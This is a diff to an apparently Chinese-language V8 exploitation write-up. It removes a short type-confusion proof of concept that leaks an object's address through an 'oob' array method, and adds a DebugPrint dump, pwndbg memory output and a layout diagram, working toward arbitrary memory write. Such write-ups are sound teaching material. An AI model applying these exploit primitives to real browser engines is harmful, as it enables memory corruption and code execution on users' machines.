@@ -315,22 +315,67 @@ class Helpers {
 - array 的 elements 也是对象，在内存结构中，往往体现为：elements 紧挨着 array，即： ** `elements[length]` 的位置上就是 array 的 `map` ** ；
 - 因此可以考虑先读出 map，再在另一种 array 的 map 处写入，即实现了类型混淆。
 
-poc 如下：
+在**没有开启指针压缩**的情况下，对象的内存布局如下：
+
+- 测试代码：
 
 ```javascript
-var obj = {};
-var obj_list = [obj];
-var float_list = [4.3];
+let float_list = [4.3];
+%DebugPrint(float_list);
+```
 
-var obj_map = obj_list.oob();
-var float_map = float_list.oob();
+- 输出：
 
-obj_list.oob(float_map);
-var obj_addr = f2i(obj_list[0]) - 0x1n;
-obj_list.oob(obj_map);
-console.log("[DEMO] addr of obj is: 0x" + hex(obj_addr));
-%DebugPrint(obj);
-%SystemBreak();
+```bash
+DebugPrint: 0x1c53f8e4f341: [JSArray]
+ - map: 0x1713bd502ed9 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
+ - prototype: 0x0f9345bd1111 <JSArray[0]>
+ - elements: 0x1c53f8e4f371 <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
+ - length: 1
+ - properties: 0x3155becc0c71 <FixedArray[0]> {
+    #length: 0x180e41d801a9 <AccessorInfo> (const accessor descriptor)
+ }
+ - elements: 0x1c53f8e4f371 <FixedDoubleArray[1]> {
+           0: 4.3
+ }
+```
+
+- gdb 中查看内存：
+
+```bash
+pwndbg> telescope 0x1c53f8e4f340
+00:0000│  0x1c53f8e4f340 —▸ 0x1713bd502ed9 ◂— 0x400003155becc01
+01:0008│  0x1c53f8e4f348 —▸ 0x3155becc0c71 ◂— 0x3155becc08
+02:0010│  0x1c53f8e4f350 —▸ 0x1c53f8e4f371 ◂— 0x3155becc14
+03:0018│  0x1c53f8e4f358 ◂— 0x100000000
+04:0020│  0x1c53f8e4f360 —▸ 0x3155becc5239 ◂— 0x200003155becc01
+05:0028│  0x1c53f8e4f368 —▸ 0xf9345be02e1 ◂— 0xc100003155becc5a
+06:0030│  0x1c53f8e4f370 —▸ 0x3155becc14f9 ◂— 0x3155becc01
+07:0038│  0x1c53f8e4f378 ◂— 0x100000000
+08:0040│  0x1c53f8e4f380 ◂— 0x4011333333333333
+```
+
+- 即对于 `FixedDoubleArray` 类型的对象，内存布局如下：
+
+```bash
++---------------------------+
+|          map              |
+|---------------------------|
+|        prototype          |
+|---------------------------|
+|        elements           |------+
+|---------------------------|      |
+|  length    |    retained  |      |
+|---------------------------|      |
+|          ...              |      |
+|          ...              |      |
+|---------------------------|      |
+|         map               | <----+
+|---------------------------|
+|         data              |
+|---------------------------|
+|          ...              |
++---------------------------+
 ```
 
 这样一来, 我们就可以开始考虑构造任意地址写了, 思路如下:
